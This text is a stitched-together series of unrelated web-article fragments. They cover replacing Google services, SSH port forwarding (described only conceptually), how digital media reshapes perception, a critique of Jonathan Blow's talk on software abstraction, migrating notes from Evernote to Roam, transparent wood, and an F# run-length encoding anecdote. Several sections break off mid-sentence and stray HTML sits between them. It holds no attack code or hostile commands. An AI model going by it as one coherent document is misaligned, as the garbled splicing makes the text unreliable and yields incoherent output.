    <p>I'm only keeping this account just in case I need the key to the dungeon. Otherwise I use <a href="https://protonmail.com/">ProtonMail</a>, which was developed by scientists at CERN <sup>(3)</sup>; 'nuff said? Sure there are plenty of other providers, but man, developed at CERN, that's like a Vulcan salute to Trekkies.</p>

    <p>🖖</p>

    <h3>Google Chrome.</h3>
    <p>On a PC <a href="https://vivaldi.com/">Vivaldi Browser</a>'s quality <em>does</em> match up to its name—and we all know <em>Four Seasons</em>. I could throw around superlatives all day, but I won't spoil the pleasant surprise. What got <em>me</em> to click “set as default browser” was Vivaldi's unmatched simultaneous customizability <em>and</em> speed. Not surprisingly, it has a thriving community forum.</p>

    <p>On mobile look no further than <a href="https://kiwibrowser.com/">Kiwi Browser</a>. To summarize their own website: fast, quiet, without annoyances. They aren't lying. Best of all, they support <em>all</em> extensions such as uBlock Origin and uMatrix; thumbs up if you know what they are already.</p>

    <h3>Google Drive.</h3>
    <p>The only thing I used Google Drive for was backing up contacts. This can easily be replaced by exporting a .vcf file. Similarly, before a factory reset, I just manually use the export function of the few apps I want backups from.</p>

    <p>But what in the case of a hard drive crash? For the most important files I use a directory that's immediately synced to <a href="https://mega.nz/">MEGA</a> by default. For instance, I'm writing this page on a file that's sent to the cloud each time it's saved. This is probably commonplace and trivial information for IT enthusiasts, but I'm certain that's not most people.</p>

    <h3>Google search.</h3>
    <p>I admit I haven't found any search engine with better results than Google, despite its bias. If you want to avoid Google completely, use <a href="https://duckduckgo.com/">DuckDuckGo</a>—but let's call it <a href="https://duck.com/">duck.com</a> from now on so we can say “duck it” instead of “google it”.</p>

    <p>Ideally, just be efficient and use shortcuts for multiple search engines.</p>

    <h3>Google Authenticator.</h3>
    <p>If Google Authenticator is a Trump Hotel, then <a href="https://getaegis.app/">Aegis Authenticator</a> is a Ritz-Carlton. Why? Aegis is open source, supports backups, and offers more security. Therefore, unless you want to be “grabbed by the pussy” <sup>(4)</sup>, you know where to stay.</p>

    <h3>Google Translate.</h3>
    <p><a href="https://www.deepl.com/">DeepL</a>. The translations it produces are astounding; single words as well as full text translations. Try it, I'm confident you'll confirm that it beats Google.</p>

    <h3>Google Ads.</h3>
    <p>Fuck ads, and I'm being polite. To find out how I block all of them I suggest you read my post “<a href="https://www.quitfacebook.org/file/adblocking.html">Ad blocking, or how to use the Web properly.</a>”</p>

    <h2>Why do I care?</h2>
    <p>I don't have a coherent answer yet; the problem is multifold and my expertise is lacking. Regardless, things don't feel right. For one, it greatly bothers me that there is a vast collection of fantastic software that doesn't get the attention it deserves. Especially the ones made by praiseworthy developers who refuse ads and trackers. Frequently they're hidden behind products of those who can spend the most on marketing, or they suffer traffic loss by biased search results. Consequently, these virtuous mindsets don't get incentivized as they earn significantly less money. Developers with a backbone deserve to be rewarded more. Additionally, the dumbing down of devices and software decreases all-around tech savviness and makes us more reliant while hypocritically increasing the attitude of taking things for granted.</p>

    <p>To add fuel to the fire, we've become addicted to convenience because monopolies handed us everything on silver plate in return for our data, all so the consumption of whatever can be increased. It sounds like a conspiracy, but it isn't; data is seen as the new oil for just that reason: manipulation. Call me old-fashioned all you want, but I consider wilful manipulation evil. The fact that Facebook is still around after all their <em>known</em> scandals proves how hollow we've become.</p>

    <p>“If they don’t stand for something, they will fall for anything.” —Anonymous proverb <sup>(6)</sup></p>

that allows traffic entering one side of the tunnel to transparently exit
through the other. While the term originally referred to tunnels using TUN/TAP virtual
network interfaces, it's commonly used to refer to SSH port forwarding nowadays.
Use cases include:</p><ul data-v-4fc16f31=""><li data-v-4fc16f31="">Providing encrypted channels for protocols that use plaintext</li><li data-v-4fc16f31="">Opening backdoors into private networks</li><li data-v-4fc16f31="">Bypassing firewalls</li></ul><p data-v-4fc16f31="">This page is a work-in-progress.

to some destination through an SSH server. This lets you access
remote services over an encrypted connection as if they were local services.
Example use cases:</p><ul data-v-47beec60=""><li data-v-47beec60="">Accessing a remote service (redis, memcached, etc.) listening on internal IPs</li><li data-v-47beec60="">Locally accessing resources available on a private network</li><li data-v-47beec60="">Transparently proxying a request to a remote service</li></ul></div><div data-v-47beec60=""><h4 data-v-47beec60="">Remote port forwarding</h4><p data-v-47beec60="">Remote port forwarding allows you to forward traffic on an SSH server

This gives users on public networks access to resources on private networks.
Example use cases:</p><ul data-v-47beec60=""><li data-v-47beec60="">Making a local development server available over a public network</li><li data-v-47beec60="">Granting IP-restricted access to a remote resource on a private network</li></ul></div><div data-v-47beec60=""><h4 data-v-47beec60="">Dynamic port forwarding</h4><p data-v-47beec60="">Dynamic port forwarding opens a SOCKS proxy on the SSH client that lets

<p>Last week I spoke at the <a href="http://newpublic.org/">New_Public festival</a> in an “online park” where designers, urbanists, and artists explored how to create better “digital public spaces”. While preparing for the session I hosted, I started questioning how we came to understand our social media platforms as the “new public square” in the first place. The road to widespread internet adoption was paved with spatial metaphors, which helped non-technical people wrap their heads around this brand new technology. We drove down the information super<em>highway</em>, we visited cyber <em>space</em>, we navigated to web <em>sites</em>. Software designers were known as digital <em>architects</em> who built virtual places for work and play. We talked about the internet as if it was <em>outside</em> of us —&nbsp;an environment to wander around in, an ocean to surf.</p>

<p><img src="https://aaronzlewis.com/images/digital-sensorium/internet.gif"></p>

<p>But <a href="https://twitter.com/fIowerstructure">É. Urcades</a>, one of my favorite technologists on the interwebs, has challenged me to think differently about digital spaces. “websites”, he says, “are absolutely not places or architecture, they are temporary bodies … when you design interfaces you are -literally- designing the sensory organs people use to perceive information — interface design is organ design.” When our organs of perception get augmented by new technologies, we experience subtle shifts in our relationships with each other and with our selves. Throughout the 2010s, some <a href="https://qz.com/677218/this-woman-a-self-described-cyborg-can-sense-every-earthquake-in-real-time/">wannabe</a> <a href="https://en.wikipedia.org/wiki/Neil_Harbisson">cyborgs</a> have already undergone extremely invasive procedures to augment their default “hardware”. But if É. Urcades is right, you don’t even need risky surgery to acquire new senses. You just have to turn on your (pocket) computer.</p>

<p>Thirty years into the digital age, it’s safe to say the internet isn’t just an <em>external</em> environment that we travel through or a “public space” that we stroll around in. It’s fully entangled with our nervous systems now, and it has re-shaped our minds in ways that aren’t always easy or comfortable to articulate. This process became even more apparent during 2020 —&nbsp;a year in which screens swallowed the last remaining bits of our “offline” culture and daily lives. I don’t think we’ll be able to create the sort of digital publics that the New_Public festival is aiming towards until we’ve adequately taken stock of what happens <em>within us</em> when we <a href="https://twitter.com/HipCityReg/status/1340760227021533186?s=20">live</a> with the technologies we’ve built.</p>

<p>To that end, I wrote up 8 first-person stories about the new psychologies that have emerged under the influence of digital media. These accounts are based on a number of conversations with internet friends and strangers over the last few years. This is no doubt a small sampling of the subjective experiences that have been created by our software “sense organs.” What other unique sensory configurations are floating around out there, waiting to be discovered? Starting today, I’m opening up a digital <a href="https://j200lig809x.typeform.com/to/aKlUewsm">hotline</a> in order to find out. You can think of the stories below as the very first submissions to the hotline. Perhaps you’ll even recognize some of the experiences they describe as your own.</p>

<strong>subject: Exoskeletal unease</strong><br></p>

<p>You know that feeling when you outgrow your wardrobe? When you no longer feel like yourself in your old clothes? That happens to me with my virtual avatars and profile photos. Or maybe my accounts are more like <a href="https://twitter.com/ctbeiser/status/1171603433301790720?s=20">exoskeletons</a> that I have to shed as I grow, and they absolutely need to be maintained because they’re as much “me” as anything else. My physical body no longer feels like the “center of gravity” of my identity… my sense of presence is forever <a href="https://hipcityreg.substack.com/p/the-concurrency-pool">fractured</a> and distributed all over the place. I close my eyes and imagine all the screens that are displaying my content at this very moment, I wonder about the total number of pixels I currently occupy, I feel like I am nowhere and also everywhere. After a while, the exoskeleton I wear online doesn’t really feel like a true expression of my inner self. It’s so much <a href="https://twitter.com/matildepark_/status/1258240760698286080?s=20">work</a> to keep it up to date, but I basically don’t have a choice because that’s where I do most of my socializing nowadays. To be honest, my internet friends are the only people who really understand what I’m about —&nbsp;everyone else is stuck with a shallow, incomplete version of me. As you can probably tell, I pour a lot of my self into these apps. When they die, like Vine did a few years ago, it feels almost like a psychological amputation. I’m permanently cut off from a part of my exoskeleton, and I have to grow a whole new shell.</p>

<strong>subject: Hyperlink holism</strong></p>

<p>So I started putting together a wiki of all my personal knowledge about 4 years ago, before Roam and Notion and Are.na were even a thing. I really wanted to be able to surf across my own mind the way other people surf across the web. My database is an always-growing <a href="https://twitter.com/visakanv/status/1091506683036164096?s=20">network</a> of quotes, speculations, Bible verses, synchronistic hyperlinks, and interesting juxtapositions of information that I’ve collected from all over the place. Now that I’ve been building this wiki for a few years, my perception seems way more hyperlinked than it used to. Any random object or situation gives me like 400 flashbacks to books X, Y, Z and obscure historical references 1, 2, 3. I can’t look at a thing anymore and just see the thing. I filter all new info through the lens of my digitally extended mind and it feels like a superpower, or like that NZT-48 drug from the movie <em>Limitless</em>. Guess you could say I run my own little intelligence agency. Sometimes I even prefer video chat to IRL convos because I can easily reference my external brain without the other person noticing. If I ever lost access to my database, I’m not really sure <em>what</em> I’d do. I think the networked note-takers are really on the front lines of creating the Global Social Computer in the Cloud. Part of me suspects that someday, after I’m gone, someone will be able to use all my data to bring me back to life in deepfake form, like they <a href="https://adage.com/article/advertising/parkland-victim-joaquin-oliver-comes-back-life-heartbreaking-plea-voters/2285166">did to that kid</a> who died in the Parkland shootings. It gives me peace of mind to think that maybe, just maybe, my digital soul will survive into the far future —&nbsp;long after my meatspace body has decomposed.</p>

<strong>subject: Digital bicameralism</strong></p>

<p>Twitter has definitely changed my relationship with my internal monologue. Just like my vocal cords and larynx turn my silent neural activity into vibrating air molecules, my <em>external</em> voice box on twitter dot com turns my inner rumination into text on someone else’s screen. Before I started posting, my thoughts were more abstract and non-verbal —&nbsp;like blobs of play-doh floating around a zero gravity chamber. I used to spend a lot of time re-molding these amorphous thought forms into Twitter-friendly nuggets. But nowadays my internal monologue speaks tweet by default. Thoughts bubble up from the depths of my psyche readymade for the timeline, already twisted into the pre-programmed shape of a Post. I wonder if the algorithm is starting to interfere with the way my subconscious works. What if it’s filtering out thoughts that it doesn’t think will perform well online? Every day, thousands of strangers upload little slices of their consciousness directly into my mind. My <a href="https://reallifemag.com/podcast-passivity/">concern</a> is that I’m prone to mistake their thoughts for my own — that some part of me believes I’m only hearing myself think. Sometimes when I wake up in the morning, I’ll scroll through my old posts just to remind myself of myself. It feels like looking in the mirror. I’m swallowing my (digital) self so that I’m <em>me</em> instead of someone else.<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup></p>

<p>I basically spent all my childhood building worlds in SimCity and Rollercoaster Tycoon and zooming into random cities on <a href="https://reallifemag.com/springtime-everywhere/">Google Earth</a>. These apps definitely inspired my decision to work in urban planning. This might sound weird, but when I walk through a building I can usually <a href="https://twitter.com/aaronzlewis/status/1260366804184117248?s=20" title="">tell you</a> what version of AutoCad they used to design it. After spending years and years in rendering software, you sort of get a sixth sense for the tools &amp; features that the architect had access to, and the IRL built environment starts to feel kinda fake — like the different “towns” inside Disney World. On top of that, the POV of the virtual camera follows me out into the “real world.” I’m pretty good at hallucinating what my surroundings would look like from the drone’s eye view. (The other day, one of my friends was telling me that he can convince himself he’s playing The Sims or a first-person shooter game with his own body, monitoring the little green bars, making sure his stats are all good). When I look at the gradient of a beautiful sunset, or the hairline cracks in a concrete sidewalk, or the murky texture of a cumulonimbus cloud, I can’t help but think about how hard it’d be to make something like that in Unity. It’s almost like the world is a big game engine and God is the supernatural renderer. Maybe one of these days I’ll turn around too quickly and spot a glitch. Sometimes I mix up my IRL memories with memories from my VR experiences, but that’s a whole other story…</p>

<p>I’ve been on TikTok a lot lately, and it’s kind of changed the way I see and hear things. When I’m scrolling the For You page, I’m not really taking in each video as a whole —&nbsp;I’m always deconstructing it in my mind. I process the audio separately from the visuals and try to figure out how I might re-use the sound for my own content ideas. The weird thing is that this “Song Exploder” mode of hearing has seeped into my everyday life. When I’m out and about, I’m constantly sensing my auditory environment through the TikTok filter in my head. When I’m hanging out with friends who spend a lot of time on the app, we can basically speak a whole different language together.

<h2>Is Software Abstraction Killing Civilization?</h2>

<p><b>Or: Jonathan Blow is wrong but also right and we still
need to prevent the collapse of civilization</b></p>

<p><i>Early 2021</i></p>

<p>
I recently stumbled upon
<a href="https://www.youtube.com/watch?v=ZSRHeXYDLko">a talk by game
development guru Jonathan Blow</a>, about how software 
abstraction will lead to the end of civilization. Quick summary:
</p>
<ul>
  <li>Information passed on between generations is diluted.
    Practise is better than theory for keeping skills alive.</li>
  <li>Software runs the world.</li>
  <li>Abstraction fosters ignorance about low level programming.</li>
  <li>If we forget low level stuff, civilization will fall apart
    since we won't be able to keep vital software running.</li>
</ul>
<p>
It was one of those 
talks that might at a first glance seem perfectly reasonable, not least 
because similar ideas are regularly discussed in programmer circles by a
great number of 
people. Then you start thinking about what's said, and all the errors and 
misconceptions presented makes you feel troubled, because it's both 
tempting and easy to perpetuate the punchlines without
considering their implications. <b>I agree with Blow that it's
important to pass knowledge between generations. Therefore, the veracity
of that information is extremely important.</b> I propose that
the information given in the very talk about the importance of
such information, is in fact wrong on many counts.
</p>

<p>
That's why I, in this rather long text, have tried to examine Blow's
claims in detail. (TL;DR: Someone is wrong on the Internet - man with
ample spare time on his hands to the rescue!)
</p>

<h3>Some examples of collapsed civilizations and artefacts lost in time</h3>

<p>
I'm not a historian and will not comment on this first part of the talk. It doesn't matter much, though; my gripe is mainly with the second part.
</p>

<h3>Five nines</h3>

<p>
Blow says we used to use the "five nines" (99.999% uptime) metric when selling computer systems. Since his laptop has the habit of rebooting when in sleep mode, it can never be a candidate for 99.999% uptime. This part is true: five nines means a total yearly downtime of just above five minutes. This is presented as proof that we have lost a rhetoric of quality. This part is false.
</p>

<p>
In reality, five nines usually applies to things like emergency response switchboards (911), hospital systems, financial transaction processing, etc. It's also a metric usually accompanied by long contracts detailing various downtime scenarios that couldn't possibly count as downtime. It has never, ever been used to sell consumer laptops or the word processors we run on them.
</p>

<p>
It's also incorrect that five nines isn't used anymore: several companies, such as IBM and Amazon, sell such systems and services. Incidentally, IBM actually goes further and claims their Power9 platform can provide even higher availability. Provided, I'm sure, the network used to reach it is functioning and the client computers are working and, and, and... you get the point.
</p>

<p>
So, no, we haven't lost this rhetoric of quality. We've simply never used it the way Blow claims.
</p>

<p>
Oh, and in case anyone's wondering, my laptops never reboot unless I tell them to and one of them currently has an uptime of 55 days.
</p>

<p>
<img src="https://www.datagubbe.se/endofciv/uptime_brumbrum.png" alt="A photo of my laptop's screen, showing a 55 day uptime.">
</p>

<h3>"The industry hasn't produced robust software for decades"</h3>

<p>

What is robust? Is it my iPhone, going for weeks and months without a 
reboot? Is it
<a href="https://arstechnica.com/information-technology/2013/03/epic-uptime-achievement-can-you-beat-16-years/">the famous uptime of Novell's file and printer servers</a>, 
with documented instances running for 16 years? Is it the multi-year 
uptimes of a plethora of Unix, Windows and VMS machines? Is it the 365+ 
days (and counting) uptime of some random Linux web server I've got 
access to? Is it turnkey systems like IBM i, offering continuous 
availability?

</p>

<p>
Apparently none of the above, according to Blow.
</p>

<h3>"Tech companies are no longer about pushing tech forward"</h3>

<p>
Well, yes and no. I agree that the lifestyle app startups of Silicon Valley (and elsewhere) are hardly about pushing tech forward - but people more interested in making money rather than amazing technology has always been around. Was Infocom's umpteenth text adventure about pushing tech forward? Was any of the ten bazillion (a rough estimate) jumpy-shooty platform games produced? Was MS-DOS, single-tasking its way through 15 years of building Microsoft's empire right up until its last breath in version 6.22?
</p>

<p>
There's a lot of exciting stuff happening on the "hard tech" front. Blow does mention machine learning earlier in his talk, but "boring" things like file systems, web servers, databases and programming languages are also continually developed and improved upon. A lot of effort is also going into improving the various layers of abstraction, virtualization and containerization Blow is so adverse to - but him disliking them doesn't mean they're not about pushing tech forward.
</p>

<h3>"Abstraction leads to loss of capability."</h3>

<p>
Blow lists a number of programming languages, some of which have fallen out of fashion because of abstraction. His take basically boils down to learning assembly coding, memory management and pointers.
</p>

<p>
I agree that a large number of programmers today (myself included) are very happy with not having to deal with things like memory allocation and pointers. And yes, there are certainly horrifying examples of when abstraction gets the better of us. Plenty of web sites use a lot of completely unnecessary JavaScript framework voodoo to render a simple blog and plenty of supposed "desktop apps" are really running (very slowly) inside a bundled browser.
</p>

<p>
Despite that, I'm willing to bet a few bucks there are more people 
around today (including youngsters) who can program in C than ever 
before, and that more C and assembly code is being written than ever 
before. Linux and NetBSD, for example, are continuously being ported to 
pretty much everything that even vaguely resembles a CPU. Rust, a new 
language with a heavy focus on robustness, <b>does</b> feature pointers and 
lets the programmer manage memory. Harvard's introduction to Computer 
Science, CS50, is publicly available on Youtube and each year it 
features <a href="https://www.youtube.com/watch?v=cF6YkH-8vFk">a two hour
lecture on stuff like memory layout, pointers,
malloc() and free()</a>.
</p>

<p>
I agree that the things mentioned here are good to know about and I think anyone seriously into programming should at least try them out some time, if for no other reason than to understand why a lot of us prefer to avoid them if given the option to do so.
</p>

<p>
Oh, and garbage collection and functional programming aren't new 
abstractions. Lisp did both in the late 1950s and it's been used in a 
lot of "hardcore" settings, including
<a href="http://flownet.com/gat/jpl-lisp.html">NASA's Jet Propulsion Lab</a>.
And, unsurprisingly, a Lisp programmer will of course claim that Lisp
makes you much more productive than something with malloc() ever will.
</p>

<h3>"The productivity of Facebook employees is approaching zero"</h3>

<p>
Here we're shown some graphs of the rising number of Facebook and Twitter employees and Blow states that since Facebook doesn't really get that many new features each year, all those programmers mostly sit around and do nothing.
</p>

<p>
First of all, I'm pretty sure Facebook employs a wide range of staff who are not feature developers: lawyers, accountants, graphical 
designers, sysadmins, researchers, HR, middle management, etc. When not working on Facebook the site, employees of Facebook the company 
are also working on Instagram, WhatsApp and Oculus VR to name some of their other pursuits. I'd also argue that (measurable) individual 
output in general drops as a result of a company growing. You need to reach a certain critical mass to have a whole team working hard on 
a feature only to, by some managerial decision, drop it right before it's finished. Things like that happen all the time in large 
software companies and won't show up in Blow's rather flimsy metric.
</p>

<p>
More importantly, Blow constructs this argument around the assumption that Facebook's product is Facebook, in the sense of the social platform. This is of course wrong. Facebook doesn't have to add or change very many features on their social platform every year, they just have to keep things smooth enough for those who actually use those functions to stay content.
</p>

<p>
This is because Facebook's real product is an ad delivery platform.
</p>

<p>
As such, it collects massive amounts of personal and private data and churns it into targeted ads, all the while sucking people in with cleverly designed attention-grabbing dark patterns. I'm sure plenty of work is done on this by a whole lot of programmers, but it'll never appear as "features" to the user, only as corporate revenue. In that respect, Facebook programmers seem to be highly productive.
</p>

<h3>Ken Thompson's "Three Week Unix"</h3>

<p>
First off, I'm not out to belittle Ken Thompson's efforts here. Writing an assembler, editor and basic kernel in three weeks is highly respectable work by any standard. It's also a great piece of computer lore and fits Blow's narrative perfectly - especially with Kernighan's little quip about productivity in the end. Of course, we don't know how "robust" Thompson's software was at this stage, or how user friendly, or what kind of features it had. I'm going to boldly claim it would've been a hard sell today, even if it did run on modern hardware.
</p>

<p>
I'm also pretty sure Thompson dealt with little or nothing of the following during those three weeks: documentation, code reviews, daily standups, backlog grooming, user stories, unit tests, customer demands, A/B testing, writing commit messages and adhering to a corporate code formatting standard. We are after all talking about a guy who, when he could pick any names he wanted, opted for "creat", "mv" and "cp".
</p>

<p>
I'm also certain Thompson could work alone in a private office, rather than share an open floor plan with fifty colleagues incessantly shouting into cellphones, shuffling furniture around or having animated discussions about football two feet from his desk.
</p>

<p>
It's important to remember that apart from hardware and software, the working conditions for most developers are vastly different …</p></div></div>

<p>New Year’s Eve morning, I decided to start the new year with Roam. </p>



<p>A few days ago, I noticed, I passed the threshold of 5,000 notes in Evernote. The last two years, my daily-not-so-daily Logs are missing a piece of organization, that I might find in Roam. That’s how Travis Daily started his post on <a href="https://travisdailey.com/migrate-to-roam-research/">how to migrate from Evernote to Roam</a> “I have 5000 plus notes in my Evernote account”. </p>







<h2 id="0-roam-sources">Roam Sources</h2>



<ul><li><a href="https://travisdailey.com/migrate-to-roam-research/">Migrate From Evernote To Roam Research With Notion</a> by Travis Daily</li><li><a href="https://www.roamtips.com/">Roam Tips by </a>Mark Traphagen (<a href="https://twitter.com/marktraphagen">@marktraphagen</a>)</li><li><a href="https://www.nateliason.com/blog/roam">Roam: Why I Love It and How I Use It</a> by <strong>Nat Eliason</strong> – one of my long reads of this week. </li></ul>



<p>The first time,  I heard about Roam was on the<a href="https://reactpodcast.simplecast.com/episodes/104"> 104th episode of the React podcast by Chantastic</a>. <a href="https://jevakallio.dev/">Jani Eväkallio</a> talked  about Roam and about his app called <a href="https://foambubble.github.io/foam/">Foam</a>, that allows you to transform your VSCode instance to a Roam app. The ideas on Roam are all based on <a href="https://fortelabs.co/blog/">Tiago Forte’s work</a> and <a href="https://www.buildingasecondbrain.com/">Build a Second Brain</a> approach. There is actually a <a href="https://fortelabs.co/blog/the-second-brain-manifesto/">“Second Brain Manifesto”</a></p>



<p><strong>Roam Research </strong>doesn’t have an API yet for further integration with other tools but there is a <a href="https://github.com/artpi/roam-research-private-api">‘Private API’</a> by <a href="https://piszek.com/">Artur Piszek</a> from Warsaw,  working at Automattic. Artur also created the <a href="https://deliber.at/wp-roam-block/">Roam Block plugin</a>, I have yet to test. </p>



<h2 id="1-strong-import-all-evernote-items-to-notion-strong">Import all Evernote items to Notion</h2>



<p>I already have a Notion account I started and then never used from 2019.</p>



<div><figure><img loading="lazy" width="268" height="238" src="https://icodeforapurpose.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-31-at-11.34.36-AM.png" alt=""></figure></div>



<p>Turns out my notes numbers (over 5,000) are inflated. In 2012, in a misguided attempt to preserve Twitter Favorites, I sync them with Evernote via IFTTT, to never looked at them again. I let it run between  Dec 14, 2012 to April 29, 2015, and I accumulated 2112 single notes. Those won’t come over to RoamResearch. Since then, I archive Tweets, favorites aka likes and follows on Google Sheet.  </p>



<p>I felt great relief when Notion’s import script showed me the breakdown of notes in notebooks,  so I can select the ones I would want to import.  The breakdown also reveals some abandoned attempts to organize my notes. </p>



<p>It takes more than a couple of minutes, I guess. 30 minutes into the import time, I could only see notes back to 2018. It seems, the connection only imported about 550 of the 2872 notes and then stopped. I tried to start it again, and it counted through the imported once rather quickly so there seems to be a duplicate check. I am happy about that. I read through the documentation on Evernote import, and it didn’t mention any rate limits. </p>



<p>I started a chat through the <a href="https://www.notion.so/Help-Support-e040febf70a94950b8620e6f00005004">Help and Support pages at Notion</a>. I connected with two people. <em>“This is definitely not intended behavior and has been filed with our engineering team. Unfortunately, we may not have a fix right away, but know it’s on our to-do list.</em>” Meanwhile, I’ll follow this advice: <em>“Sometimes it’s caused by a single (usually large) page. If you are importing multiple notebooks, would you mind trying to import your notes in smaller batches? If there are lots of photos, videos, etc. I’d try importing those a few at a time, but if they’re just text you can import them in larger batches :)”</em></p>



<p>Moving in Evernote only works with 50 Notes at a time. God, my grandmother was right. </p>



<figure><blockquote><p>Computers are a colossal waste of time! </p><cite>Oma Pauli</cite></blockquote></figure>



<p>I copy/pasted today’s#1023 note over to Roam to get acquainted with the future interface. I might as well go on our lunch run. </p>



<p>15 days in I am still in love with Roam and now really need to continue the work to migration Evernote content to Roam Research. </p>



<h2 id="2-from-notion-to-roam-research">From Notion to RoamResearch</h2>



<p>So now that many notes have been imported to Notion, I exported them as instructed. The import into RoamResearch works, but it’s only 10 files at a time. 🤦‍♀️</p>



<p>I also expected that <em>RoamResearch</em> would be able to read the created date and import it accordingly. Now all have today’s date. I had to change every note’s name to turn it into a Daily Note. For that purpose, a 10 file limit is probably good. </p>



<h2 id="3-private-api">Private-api</h2>



<p>I had hoped that Artur Priszek’s private-api would get me started, but it doesn’t have much documentation beyond the read me and the roam-quick command, I could get working. I need to dive into code, to figure out how it would work beyond. I can see myself creating a little CLI app that hides away the access credentials and lets me write via the command line something like <code>rem 'Call your mother tomorrow' </code>and have it show up in the Quick Capture of the app, when I switch over to the app again.  </p>



<h2 id="4-what-i-like-about-using-roam-research">What I Like about using Roam Research</h2>



<ul><li><strong>Command + K works</strong> for adding link to highlighted text. It also uses pure Markdown [link text](linkurl) and converts it to links once you leave the editing mode. </li><li><strong>Adding a tag is as easy </strong>as adding a # before the work. </li><li><strong>Can import JSON + Markdown.</strong> </li><li><strong>Slash command</strong> and first item on the list is the TODO item once I hit enter my checkbox are back.</li><li>The <strong>Sidebar</strong> shows me all Todos in one screen as well as the “Done” items. </li><li>The <strong>auto-creation of daily pages</strong> is neat and a time saver. I started adding future dates to do items or preparation for meetings etc. very helpful. In the morning, I open the RoamResearch app and see what my past self has in store for me. </li><li>Easy page merge: So with any other notes app, that has a tagging feature, I would never get the spelling right for hashtags and other tags and end up with too many tags that are misspellings, and they are a pain to consolidate, so I never did. With RoamResearch, when I discover I two similar tags, I decide on a single one and just change the page title of the other one, and it merge the two page. Brilliant. </li><li>The biggest tools especially after I import the Evernote notes will be the <strong>‘Unlinked references’</strong> it finds for a certain topic. It unloads the cognitive loads, you have to put into document management, for when you forget the coding of certain things. </li></ul>

It offers a “Link All” feature now. </figcaption></figure>



<h2 id="5-what-i-find-missing-or-wanting">What I find missing or wanting</h2>



<ul><li>Definitely an <strong>API to integrate with other services</strong>. </li><li><strong>Faster load on mobile.</strong> It’s spins for multiple seconds until I can start adding text, and sometimes I can’t get it to sync from other devices. </li><li>Seems at publishing date, the right sidebar is broken. It’s just shows an empty column. </li></ul>

<p>After a month of using it, I am definitely comfortable, sometimes still lost. February will be the month going from Novice to competent user on the Dreyfus’ “Five-Stage Model of Mental Activities Involved in Directed  Skill Acquisition”. I just read it. Speaking of Reddit, there is a <a href="https://www.reddit.com/r/RoamResearch/">RoamResearch community</a> and in a pinned post, are some thoughts on <a href="https://www.reddit.com/r/RoamResearch/comments/eho7de/building_a_second_brain_in_roamand_why_you_might/">how to work on projects</a>. That’s my next adventure. </p>

The clear wood&nbsp;is lighter than glass, with better insulating properties, which is important because windows are a major source of heat loss in buildings. It also might take less energy to manufacture clear wood because there are no high temperatures involved.</p>  <p>Transparent wood could become an alternative to glass in energy efficient buildings, or perhaps coverings for solar panels in harsh environments. There could be no end of uses.</p>      <p>Many different types of wood, from balsa to oak, can be made transparent, and it doesn't matter if it is cut along the grain or against it. If the transparent wood is made a little thicker, it would be strong enough to become part of the structure of a building, so there could be entire transparent wooden walls.</p>  <p>While this technology has yet to&nbsp; be scaled up to industrial levels, the researchers say it has great potential as a new building material. In fact, they say that theoretically, an entire house could be made transparent. It is not clear why anyone would want to live in a transparent house, but for people who do, it would be OK to throw stones…</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/transparent-wood-qinqin-xia-university-of-maryland.jpg 300w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/transparent-wood-qinqin-xia-university-of-maryland.jpg 460w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/transparent-wood-qinqin-xia-university-of-maryland.jpg 620w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-qinqin-xia-university-of-maryland.jpg 780w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/transparent-wood-qinqin-xia-university-of-maryland.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-qinqin-xia-university-of-maryland.jpg"></p></div><figcaption>A researcher holds up a 10-centimetre long slab of the see-through wood.<!-- --> <!-- -->(Qinqin Xia, University of Maryland/Science Advances)</figcaption></figure></span></p>  <p>Images copyright Xia et al.&nbsp;<a href="https://creativecommons.org/licenses/by-nc/4.0/" rel="license">Creative Commons Attribution-NonCommercial license</a>,&nbsp;</p></span></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div id="post-body">
        <p><a href="https://twitter.com/Al_Grigor/status/1357028887209902088?ref_src=twsrc%5Etfw">The other day on Twitter</a></p><blockquote>Most candidates cannot solve this interview problem:<p>Input: "aaaabbbcca"</p><p>Output: [("a", 4), ("b", 3), ("c", 2), ("a", 1)] Write a function that converts the input to the output I ask it in the screening interview and give it 25 minutes How would you solve it?</p></blockquote><p>I thought about it for a few minutes while I was doing other things, came up with the answer, congratulated myself (yay me!) and went on to other things.</p><p>Then it was posted on a tech forum. How would you answer the question? Lots of folks weighed in, all with seemingly (to me) long-winded coding solutions. Surely they didn't realize the genius of &nbsp;my solution in F#! So I posted it.</p><blockquote>In F#, t looks to me like “aaaabbbcca” |&gt; Seq.countBy id;;<br>I don’t know how to make it any simpler than that.</blockquote><p>Once again, I congratulated myself (yay me!) and moved on. Later that day, I logged on again and a commenter was nice enough to give me my comeuppance.</p><blockquote>Unfortunately, this doesn’t return the expected output. That last “a” is what throws a wrench in solutions like this.</blockquote><p>Looking back at that tweet, holy shit! I missed that second "a"! Well hell, this is a completely different kind of problem than I first thought. I'll just copy the input string from the website and bang something out in order to save my honor. A wrong must be righted.</p><p>I spent the next hour or two staring at the code and wondering what the hell is going on. Twenty lines of code and it doesn't compile. Gives me something like:</p><blockquote>error FS0010: Unexpected character '“' in interaction</blockquote><p>Did I cast something the wrong way? I tried recasting things. Did I hose up my environment? I reloaded. Is my code structure off in subtle ways? Nothing I did seemed to work. Finally, out of desperation, I started a new project and re-typed everything in by hand.</p><p>It worked.</p><p>The problem? When I copied and pasted the input code, it was using typographic quotes, not programming quotes. It was a copy-and-paste problem, of the freaking input data, that had defeated me all of that time.</p><p>Once that was out of the way, I kicked out the solution rather quickly, first coding it up as a strongly-typed function and then removing the type restrictions to make it one day a generic library function. As another commenter pointed out, this is classic Run Length 